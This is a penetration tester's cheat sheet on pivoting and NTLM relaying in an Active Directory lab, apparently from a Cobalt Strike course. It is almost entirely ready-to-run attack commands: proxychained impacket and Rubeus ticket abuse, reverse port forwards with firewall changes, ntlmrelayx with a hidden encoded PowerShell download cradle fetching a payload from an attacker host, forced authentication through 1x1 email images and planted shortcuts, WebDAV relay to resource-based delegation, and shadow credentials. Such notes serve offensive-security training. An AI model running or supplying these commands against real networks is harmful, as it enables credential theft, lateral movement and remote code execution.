# Pivoting Notes

## SOCKS

start a SOCKS4a proxy, second is SOCKS5
```
socks 1080
socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

## Linux Tools

## proxychains

```
sudo vim /etc/proxychains.conf
  socks4 127.0.0.1 9050
  socks5 127.0.0.1 1080 myUser myPassword
proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
proxychains wmiexec.py DEV/jking@10.10.122.30
```

## Windows Tools
[Proxifier](https://www.proxifier.com/)

## pivoting with kerberos

```
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
export KRB5CCNAME=jking.ccache
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

using a TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session
1. delegate TGT to get a TGT for a non-elevated session
2. base64 decode the ticket and write it as a <user>.kirbi
3. then convert with ticketConverter.py
4. now we can interact with this TGT

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
ticketConverter.py bfarmer.kirbi bfarmer.ccache
proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
```

Can do this with windows attacker machines as well
1. first step is to add the *.<domain> to your proxifier rules
2. launch an instance of cmd.exe or powershell.exe
3. If we want to access the SQL-2 service through HeidiSQL then we need a service ticket for the MSSQLSvc service.  Let's use the TGT of bfarmer to do that (yes, requesting tickets through the proxy works as well).

```
runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
klist
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt
C:\Tools\HeidiSQL\heidisql.exe
```

## Browsers

Using things like FoxyProxy

## Reverse Port Forwards

allows a machine to redirect inbound traffic on a specific port to another IP and port

```
rportfwd <inbound port> <IP to send to> <port to send to>
```

In some cases you might need to make rules to allow this traffic in, easy to do that like so
```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

can delete with
```
powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

## NTLM Relaying

being a mitm of the ntlm authentication and passing the request to the target 
Tools:
[PortBender](https://github.com/praetorian-inc/PortBender)

Steps
1. will need a SYSTEM beacon on a machine you are doing the capture of SMB traffic on
2. allow those ports inbound on the firewall
3. start two reverse port forwards - one for SMB capture and another for a powershell download cradle
4. then setup a SOCKS proxy that ntlmrelayx can use to send relay responses back to the network
5. then run ntlmrelayx.py
6. upload the PortBender driver in the default windows driver location
7. run portbender to redirect traffic from 445 to port 8445
8. coerce a user to auth and you will be able to capture that traffic
9. link the new beacon

```
on beacon:
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8445 localhost 445
rportfwd 8080 localhost 80
socks 1080
on attacker machine:
sudo proxychains ntlmrelayx.py -t smb://<target IP> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <download cradle pointing at the /b SMB payload>'
cd C:\Windows\system32\drivers
upload C:\Tools\PortBender\WinDivert64.sys
  **Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console.**
help PortBender
PortBender redirect 445 8445
**coerce victim and wait**
link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

Download cradle example before base64
```
iex (new-object net.webclient).downloadstring("http://<IP>:<port>/<payload uri>")
```

# Forcing NTLM Auth

## 1x1 Images in Emails
having this in an email will trigger an NTLM auth attempt when opened in email clients like Outlook
```
<img src="\\<relayer IP>\test.ico" height="1" width="1" />
```

## Windows Shortcuts

Putting a windows shortcut on something like a public share for others to click
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()
```

Additional Tools: [SpoolSample](https://github.com/leechristensen/SpoolSample), [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) [PetitPotam](https://github.com/topotam/PetitPotam) 


## Relaying WebDAV
Tools: [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)

steps:
1. identify webDAV on remote client
2. setup relaying
3. setup firewall rules
4. coerce the service to auth to a malicious WebDAV server we control with relaying on it
5. then perform S4U2Proxt to req service tickets 

check for WebDAV
The webclient exposes a named pipe called DAV RPC SERVICE, using the GetWebDAVStatus Tool
```
sc qc WebClient
inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
```

setup relaying on attacker
```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
```
cont.., after the sharpsystemtriggers the a new machine account is created in the output of the relay and we use that to impersonate another user
```
powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:<machine account> /password:'<password created by relay>'
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:<aes from above> /nowrap
```


## Shadow credentials

This option will automatically dump a cert file for you
1. relay with --shadow-credentials
2. convert to ccache format for impacket or base64 for rubeus
3. req TGT which can then be used for S4U2Self

```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888
cat <cert.pfx> | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q[...snip...]YFLqI= /password:wBaP2YhsR7RgY0MZ6jwk /nowrap
```
